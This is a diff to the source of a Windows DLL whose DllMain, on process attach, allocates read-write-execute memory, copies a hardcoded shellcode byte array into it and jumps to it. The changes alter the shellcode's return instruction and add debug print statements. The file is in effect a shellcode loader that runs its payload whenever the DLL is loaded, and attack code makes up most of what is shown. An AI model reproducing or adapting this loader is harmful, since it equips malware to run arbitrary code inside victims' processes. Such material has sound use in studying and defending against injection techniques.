@@ -40,7 +40,8 @@ const char buf[] =
 "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
 "\x48\x81\xC4\x18\x01\x00\x00" // add rsp,118h //adjust stack pointer.
 "\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59\x41\x58\x5E\x5F\x5D\x5A\x59\x5B\x58" //popa
-"\xFF\x24\x24" // jmp [rsp] //return home!
+//"\xFF\x24\x24" // jmp [rsp] //return home!
+"\xC3" // ret
 ;
 
 BOOL APIENTRY DllMain( HMODULE hModule,
@@ -55,6 +56,8 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 
 		HANDLE hProcess;
 		SIZE_T lpBytesWritten;
+
+		wprintf(TEXT("DLL_PROCESS_ATTACH!\n"));
 		
 		hProcess = GetCurrentProcess();
 		lpvBase = VirtualAllocEx(
@@ -65,20 +68,20 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 			PAGE_EXECUTE_READWRITE);        // Protection = RWX
 		if (lpvBase == NULL)
 		{
-			wprintf(TEXT("Memory allocation failed."));
+			wprintf(TEXT("Memory allocation failed.\n"));
 			return -1;
 		}
 
 		ZeroMemory(lpvBase, sizeof(buf));
 		WriteProcessMemory(hProcess, lpvBase, buf, sizeof(buf), &lpBytesWritten);
-		wprintf(TEXT("Memory allocation complete."));
+		wprintf(TEXT("Memory allocation complete.\n"));
 
 		try {
 			((void(*)())lpvBase)();
 		}
 		catch (...)
 		{
-			wprintf(TEXT("Exception!"));
+			wprintf(TEXT("Exception!\n"));
 			return 1;
 		}
 
@@ -86,10 +89,16 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 
 		break;
 	case DLL_THREAD_ATTACH:
+		wprintf(TEXT("DLL_THREAD_ATTACH!\n"));
+		break;
 	case DLL_THREAD_DETACH:
+		wprintf(TEXT("DLL_THREAD_DETACH!\n"));
+		break;
 	case DLL_PROCESS_DETACH:
+		wprintf(TEXT("DLL_PROCESS_DETACH!\n"));
 		break;
 	}
+	wprintf(TEXT("Return true to continue dll dispatch.\n"));
 	return TRUE;
 }
 
